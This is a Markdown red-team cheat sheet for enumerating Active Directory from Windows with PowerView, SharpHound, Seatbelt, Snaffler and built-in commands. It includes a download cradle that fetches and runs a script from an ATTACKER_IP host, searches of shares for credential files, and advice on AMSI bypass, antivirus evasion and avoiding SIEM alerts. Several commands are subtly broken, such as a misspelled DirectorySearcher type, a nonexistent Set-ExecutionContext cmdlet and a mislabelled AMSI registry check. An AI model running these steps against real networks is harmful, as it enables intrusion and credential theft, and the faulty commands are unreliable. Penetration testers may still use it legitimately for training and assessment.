---
title: "Enumeration & Discovery — From Windows"
weight: 1
tags:
  - ad
  - enumeration
  - windows
  - powerview
  - sharphound
  - bloodhound
---

## Quick Reference

| Technique | Tool | Privilege Needed |
|-----------|------|-----------------|
| Domain / forest info | Native AD cmdlets, PowerView | Domain user |
| User / group / computer enumeration | Get-ADUser, Get-DomainUser | Domain user |
| SPN discovery (Kerberoast candidates) | Get-ADUser, PowerView | Domain user |
| AdminSDHolder / privileged objects | Get-ADObject | Domain user |
| ACL enumeration | PowerView | Domain user |
| Local admin discovery | Find-LocalAdminAccess | Domain user |
| Share discovery | Find-DomainShare, Snaffler | Domain user |
| Full graph collection | SharpHound | Domain user |
| Host recon | Seatbelt | Local user (some checks need admin) |
| Session enumeration | SharpHound, NetSessionEnum | Local admin (remote hosts) |
| GPO enumeration | PowerView | Domain user |
| Trust mapping | Get-DomainTrust, nltest | Domain user |

---

## Native AD Cmdlets

No extra tooling required. Requires the `ActiveDirectory` PowerShell module, which is present on domain-joined systems with RSAT installed, or can be imported from a DC.

```powershell
# Import the module if not auto-loaded
Import-Module ActiveDirectory

# Domain and forest info
Get-ADDomain
Get-ADForest
Get-ADDomainController -Filter *

# All users with all properties
Get-ADUser -Filter * -Properties *

# Privileged accounts (adminCount = 1)
Get-ADUser -Filter {adminCount -eq 1} -Properties * | Select-Object Name,SamAccountName,Enabled,PasswordLastSet,MemberOf

# Service accounts (SPN set — Kerberoastable candidates)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select-Object Name,SamAccountName,ServicePrincipalName

# All computers with all properties
Get-ADComputer -Filter * -Properties * | Select-Object Name,DNSHostName,OperatingSystem,LastLogonDate

# List all groups
Get-ADGroup -Filter * | Select-Object Name,GroupScope,DistinguishedName

# Recursive membership of Domain Admins
Get-ADGroupMember "Domain Admins" -Recursive | Select-Object Name,SamAccountName,ObjectClass

# Trust relationships
Get-ADTrust -Filter *

# Trusted domain objects via LDAP filter
Get-ADObject -LDAPFilter "(objectClass=trustedDomain)"

# AdminSDHolder — objects under protected container
Get-ADObject -SearchBase "CN=AdminSDHolder,CN=System,DC=TARGET_DOMAIN,DC=com" -Filter *

# Unconstrained delegation — computers
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select-Object Name,DNSHostName

# Unconstrained delegation — users
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select-Object Name,SamAccountName

# Constrained delegation — computers
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation | Select-Object Name,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo

# Constrained delegation — users
Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation | Select-Object Name,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo

# RBCD — computers that already have it configured
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Where-Object {$_."msDS-AllowedToActOnBehalfOfOtherIdentity"} | Select-Object Name,DNSHostName

# Password-not-required accounts (PASSWD_NOTREQD flag)
Get-ADUser -Filter {PasswordNotRequired -eq $true} -Properties PasswordNotRequired | Select-Object Name,SamAccountName,Enabled

# All DCs in forest across all domains
(Get-ADForest).Domains | ForEach-Object { Get-ADDomainController -DomainName $_ -Discover }

# All users across all forest domains
(Get-ADForest).Domains | ForEach-Object { Get-ADUser -Filter * -Server $_ }

# All computers across all forest domains
(Get-ADForest).Domains | ForEach-Object { Get-ADComputer -Filter * -Server $_ }

# Cross-domain trust mapping (external trusts only)
Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' | Select-Object Source,Target,Name
```

> **Required privileges:** Domain user. No elevated rights needed for read-only LDAP queries. The AD module must be available or loaded via `Import-ActiveDirectory`.

---

## .NET LDAP Queries (No AD Module Required)

Useful when the AD module is not present and you cannot drop tools to disk. Pure .NET, available in any PowerShell session on a domain-joined host.

```powershell
# Get current domain object
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain())

# Get current forest object
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest())

# Get all objects under CN=Users
([ADSI]"LDAP://CN=Users,DC=TARGET_DOMAIN,DC=com").Children

# Generic LDAP searcher — all users
$searcher = [System.DirectoryServices.DirectorySearcher]""
$searcher.filter = "(objectClass=user)"
$searcher.PageSize = 1000
$results = $searcher.FindAll()
$results | ForEach-Object { $_.Properties["samaccountname"] }

# Find users with SPN set (Kerberoastable)
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*))"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname","distinguishedname"))
$searcher.FindAll() | ForEach-Object {
    [PSCustomObject]@{
        User = $_.Properties["samaccountname"][0]
        SPN  = $_.Properties["serviceprincipalname"]
    }
}

# Find AS-REP roastable users (DONT_REQ_PREAUTH flag = 0x400000 = 4194304)
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
$searcher.FindAll() | ForEach-Object { $_.Properties["samaccountname"] }

# Find domain controllers
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
$searcher.FindAll() | ForEach-Object { $_.Properties["dnshostname"] }

# Query LDAP with explicit DC target
$entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC_IP/DC=TARGET_DOMAIN,DC=com","USERNAME","PASSWORD")
$searcher = New-Object System.DirectityServices.DirectorySearcher($entry)
$searcher.Filter = "(objectClass=group)"
$searcher.FindAll() | ForEach-Object { $_.Properties["name"] }
```

> **Required privileges:** Domain user (authenticated LDAP bind). Anonymous LDAP queries may work if the DC allows them, but most modern environments disable unauthenticated LDAP.

---

## PowerView — Domain Enumeration

PowerView is part of PowerSploit / PowerSharpPack. Load it with:

```powershell
# Bypass execution policy for current session
Set-ExecutionContext Bypass -Scope Process -Force

# Load from disk
Import-Module .\PowerView.ps1

# Load from memory (AMSI bypass may be needed first)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')
```

> **Required privileges:** Domain user for most functions. Local admin required for `Get-NetSession` on remote hosts. `Find-LocalAdminAccess` requires authenticated domain access.

### Domain and Forest

```powershell
# Domain object
Get-Domain

# Specific domain
Get-Domain -Domain TARGET_DOMAIN

# Forest object
Get-Forest
Get-Forest -Forest TARGET_DOMAIN

# Domain controllers
Get-DomainController
Get-DomainController -Domain TARGET_DOMAIN

# Domain policy (password policy, Kerberos policy)
Get-DomainPolicy
(Get-DomainPolicy)."system access"
(Get-DomainPolicy)."kerberos policy"

# All OUs
Get-DomainOU
Get-DomainOU | Select-Object Name,DistinguishedName,gplink
```

### User Enumeration

```powershell
# All domain users
Get-DomainUser

# Specific user
Get-DomainUser -Identity USERNAME

# Users with SPN set (Kerberoastable)
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

# Privileged users (adminCount = 1)
Get-DomainUser -AdminCount | Select-Object samaccountname,memberof,pwdlastset

# Users with specific properties
Get-DomainUser -Properties samaccountname,description,pwdlastset,badpwdcount,logoncount

# Users with descriptions containing keywords
Get-DomainUser | Where-Object {$_.description -ne $null} | Select-Object samaccountname,description

# AS-REP roastable users (no pre-auth required)
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,useraccountcontrol

# Users who can be delegated (unconstrained)
Get-DomainUser -AllowDelegation | Select-Object samaccountname

# Search by display name or other property
Get-DomainUser -LDAPFilter "(description=*admin*)" | Select-Object samaccountname,description
```

### Group Enumeration

```powershell
# All groups
Get-DomainGroup
Get-DomainGroup | Select-Object samaccountname,grouptype,description

# Specific group
Get-DomainGroup -Identity "Domain Admins"

# Recursive member enumeration
Get-DomainGroupMember "Domain Admins" -Recurse

# Groups a user is member of
Get-DomainGroup -MemberIdentity USERNAME

# Local groups on a remote host (requires local admin or NetLocalGroupEnum rights)
Get-DomainGroupMember -Identity "Administrators" -Domain TARGET_DOMAIN
```

### Computer Enumeration

```powershell
# All domain computers
Get-DomainComputer
Get-DomainComputer -Properties name,dnshostname,operatingsystem,lastlogontimestamp

# Computers with unconstrained delegation (high-value targets)
Get-DomainComputer -Unconstrained | Select-Object name,dnshostname

# Computers trusted to authenticate for another service (constrained delegation)
Get-DomainComputer -TrustedToAuth | Select-Object name,msds-allowedtodelegateto

# Find specific OS versions
Get-DomainComputer -Properties name,operatingsystem | Where-Object {$_.operatingsystem -like "*2008*"}
Get-DomainComputer -Properties name,operatingsystem | Where-Object {$_.operatingsystem -like "*XP*"}

# Domain controllers only
Get-DomainController | Select-Object Name,IPAddress,OSVersion,Roles
```

### GPO Enumeration

```powershell
# All GPOs
Get-DomainGPO | Select-Object displayname,gpcfilesyspath

# GPO applied to a specific computer
Get-DomainGPO -ComputerIdentity DC_HOSTNAME | Select-Object displayname

# GPOs that set local group membership (Restricted Groups / Group Policy Preferences)
Get-DomainGPOLocalGroup | Select-Object GPODisplayName,GroupName,GroupMembers

# GPOs that add users to local admin
Get-DomainGPOComputerLocalGroupMapping -LocalGroup Administrators
Get-DomainGPOUserLocalGroupMapping -Identity USERNAME -Verbose
```

### ACL Enumeration

```powershell
# ACLs on Domain Admins group object
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# ACLs on a specific user
Get-DomainObjectAcl -Identity USERNAME -ResolveGUIDs

# Find all interesting ACLs across the domain (non-default write permissions)
Find-InterestingDomainAcl -ResolveGUIDs

# Find all ACLs where the current user has write rights
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "USERNAME"}

# DCSync rights — who can replicate directory changes
Get-DomainObjectAcl -SearchBase "DC=TARGET_DOMAIN,DC=com" -ResolveGUIDs | Where-Object {
    $_.ObjectAceType -match "DS-Replication-Get-Changes"
} | Select-Object SecurityIdentifier,AceType,ObjectAceType
```

### Share and File Discovery

```powershell
# Find accessible shares across the domain
Find-DomainShare
Find-DomainShare -CheckShareAccess

# Find interesting files on accessible shares
Find-InterestingDomainShareFile -Include *.ps1,*.xml,*.txt,*.config,*.ini,*.bat,*.vbs

# Search for credential-related file names
Find-InterestingDomainShareFile -Include *pass*,*cred*,*secret*,*vpn*,*key*,*.pfx,*.p12

# Find writable shares
Find-DomainShare -CheckShareContent
```

### Local Admin Discovery

```powershell
# Find all machines in the domain where the current user has local admin
# WARNING: This generates significant network noise — one connection attempt per machine
Find-LocalAdminAccess -Verbose

# Target specific OUs
Find-LocalAdminAccess -SearchBase "OU=Servers,DC=TARGET_DOMAIN,DC=com"

# Check specific computers
Test-AdminAccess -ComputerName DC_HOSTNAME
```

> **Note (OPSEC):** `Find-LocalAdminAccess` attempts SMB connections to every domain computer. This will generate event ID 4624/4625 on all targets and may trigger SIEM alerts. Scope it to specific OUs if stealth matters.

### Trust Enumeration

```powershell
# Current domain trusts
Get-DomainTrust
Get-DomainTrust -Domain TARGET_DOMAIN

# All trusts in the forest
Get-ForestTrust

# All domains in the forest
Get-ForestDomain

# Map all trust relationships
Get-DomainTrustMapping
```

---

## SharpHound Collection

SharpHound is the official BloodHound ingestor. It collects AD data and outputs ZIP files for ingestion into BloodHound CE or the legacy BloodHound GUI.

```cmd
REM Full collection — all methods
SharpHound.exe --CollectionMethods All --ZipFileName output.zip

REM Stealth mode — DC-only queries, no host-level enumeration
SharpHound.exe --CollectionMethods DCOnly --ZipFileName dc_only.zip

REM Session and logged-on user data only
SharpHound.exe --CollectionMethods Session,LoggedOn --ZipFileName sessions.zip

REM Stealth flag (avoids noisy enumeration)
SharpHound.exe --Stealth --ZipFileName stealth.zip

REM Specify domain and DC explicitly
SharpHound.exe --CollectionMethods All --Domain TARGET_DOMAIN --DomainController DC_IP --ZipFileName output.zip

REM Authenticate with explicit credentials (useful from non-domain-joined host)
SharpHound.exe --CollectionMethods All --LdapUsername USERNAME --LdapPassword PASSWORD --ZipFileName output.zip

REM Loop collection every 15 minutes (long-term session capture)
SharpHound.exe --CollectionMethods Session,LoggedOn --Loop --LoopDuration 02:00:00 --LoopInterval 00:15:00 --ZipFileName loop_sessions.zip

REM Output to specific directory
SharpHound.exe --CollectionMethods All --OutputDirectory C:\Users\Public --ZipFileName output.zip
```

Via PowerShell module:

```powershell
# Load SharpHound PS module
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain TARGET_DOMAIN -ZipFileName output.zip
```

> **Required privileges:** Domain user for most collection. Local admin on individual hosts is needed for local group and session data collection from those hosts.

### Key BloodHound Queries (Cypher / GUI)

After importing the ZIP into BloodHound, run these pre-built or custom queries:

- **Find Shortest Paths to Domain Admins** — primary escalation path visualization
- **Find Principals with DCSync Rights** — accounts with `DS-Replication-Get-Changes-All`
- **Kerberoastable Users** — users with SPNs set, sorted by admin count
- **AS-REP Roastable Users** — users with pre-auth disabled
- **Computers with Unconstrained Delegation** — machines that cache TGTs
- **Shortest Paths from Owned Principals** — mark compromised accounts as owned, find next steps
- **Find Computers Where Domain Users are Local Admins** — via GPO or direct assignment
- **Transitive Object Control** — full delegation chain from current user to DA

Custom Cypher query — find all paths from a specific user to Domain Admins:

```
MATCH p=shortestPath((u:User {name:"USERNAME@TARGET_DOMAIN"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@TARGET_DOMAIN"})) RETURN p
```

---

## Seatbelt

Seatbelt is a C# host survey tool. It checks a large number of security-relevant host conditions and artifacts.

```cmd
REM Full recon — all checks
Seatbelt.exe -group=all

REM Full recon with verbose output to file
Seatbelt.exe -group=all -full > seatbelt_output.txt

REM User-focused checks only
Seatbelt.exe -group=user

REM System-focused checks
Seatbelt.exe -group=system

REM Credential artifact hunting
Seatbelt.exe CredEnum DpapiMasterKeys WindowsCredentialFiles WindowsVaultFiles

REM Session and logon info
Seatbelt.exe LocalAdmins LogonSessions TokenGroups

REM Miscellaneous interesting checks
Seatbelt.exe AntiVirus AppLocker AuditPolicies ChromiumPresence Certificates
Seatbelt.exe EnvironmentPath ExplicitLogonEvents FirewallRules

REM Remote execution against another host (requires local admin on target)
Seatbelt.exe -computername=TARGET_IP -username=TARGET_DOMAIN\USERNAME -password=PASSWORD -group=all
```

> **Required privileges:** Most checks run as a standard user. Some checks (`LocalAdmins`, DPAPI master key enumeration, `LogonSessions` for other users) require local admin.

---

## Snaffler

Snaffler crawls SMB shares across the domain and identifies files of interest using a scoring system based on filename patterns, content patterns, and file type.

```cmd
REM Default scan — enumerate shares and find interesting files, log to file
Snaffler.exe -s -o snaffler.log

REM Verbose data output
Snaffler.exe -s -d TARGET_DOMAIN -c DC_IP -o snaffler.log -v data

REM Target specific servers from a file
Snaffler.exe -s -i SERVER_LIST.txt -o snaffler.log

REM Target specific share path
Snaffler.exe -s -n \\SERVER\Share -o snaffler.log

REM Increase thread count for faster scanning
Snaffler.exe -s -t 20 -o snaffler.log
```

> **Note (OPSEC):** Snaffler generates SMB connections to many hosts. Each file read is a separate SMB request. Consider scoping to specific servers or shares when operating quietly.

---

## Manual Enumeration (net, nltest, dsquery)

Built-in Windows commands — no extra tools required, available on any domain-joined host.

```cmd
REM List all domain users
net user /domain

REM List members of Domain Admins
net group "Domain Admins" /domain

REM List members of Enterprise Admins
net group "Enterprise Admins" /domain

REM List all domain groups
net group /domain

REM Local administrators on current host
net localgroup administrators

REM List domain trusts
nltest /domain_trusts

REM List all DCs in domain
nltest /dclist:TARGET_DOMAIN

REM Verify domain membership and DC
nltest /dsgetdc:TARGET_DOMAIN

REM Null session test (check if anonymous enumeration is possible)
net use \\DC_HOSTNAME\ipc$ "" /u:""

REM Authenticated session
net use \\DC_HOSTNAME\ipc$ "PASSWORD" /u:"TARGET_DOMAIN\USERNAME"

REM dsquery — all users (unlimited results)
dsquery user -limit 0

REM dsquery — all computers
dsquery computer -limit 0

REM dsquery — find specific user
dsquery user -name USERNAME*

REM dsquery — all OUs
dsquery ou

REM dsquery — Domain Admins group members
dsquery group -name "Domain Admins" | dsget group -members -expand

REM WMIC — full user account list
wmic useraccount list full

REM WMIC — list domain computers
wmic ntdomain list brief
```

---

## Enumerating Security Controls

Before running further tooling, enumerate defenses to adapt your approach.

```powershell
# Windows Defender status
Get-MpComputerStatus
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled,AntivirusEnabled,AMServiceEnabled,IoavProtectionEnabled

# AppLocker policies
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# PowerShell language mode (FullLanguage vs ConstrainedLanguage)
$ExecutionContext.SessionState.LanguageMode

# PowerShell logging
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription

# LAPS — find delegated groups
Find-LAPSDelegatedGroups

# LAPS — check extended rights on LAPS-enabled computers
Find-AdmPwdExtendedRights

# LAPS — list computers with LAPS, expiry, and passwords (if you have read access)
Get-LAPSComputers

# ETW / AMSI status via registry
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AcroRd32.exe" -ErrorAction SilentlyContinue

# Check for CLM bypass paths
# %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe runs independently of policy
# PowerShell_ISE.exe may also bypass constrained language restrictions
```

---

## winPEAS — AD Sections

winPEAS automates host privilege escalation checks and includes AD-focused enumeration.

```cmd
REM Domain information section only
winPEAS.exe domaininfo

REM Full scan — all checks
winPEAS.exe all

REM Redirect output to file (winPEAS output is verbose)
winPEAS.exe all > winpeas_output.txt

REM Quiet mode
winPEAS.exe quiet
```

> **Note (OPSEC):** winPEAS.exe is heavily signatured by most AV. Consider obfuscating or using the PS1 version loaded in memory.

---

## Key Enumeration Artifacts to Collect

During enumeration, record the following before moving to exploitation:

| Artifact | Why It Matters |
|----------|---------------|
| Domain SID (DOMAIN_SID) | Required for Golden / Silver ticket forging |
| DC hostname and IP (DC_HOSTNAME, DC_IP) | All Kerberos attacks target the DC |
| Domain name (TARGET_DOMAIN) | Required for ticket requests |
| Admin count users | Direct escalation targets |
| Kerberoastable SPNs | Offline cracking targets |
| AS-REP roastable users | No credentials needed |
| Unconstrained delegation computers | TGT capture via Coerce |
| Constrained delegation services | S4U2Proxy abuse |
| ACL write edges in BloodHound | Lateral / escalation paths |
| Accessible shares with sensitive files | Credential reuse, config leaks |

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
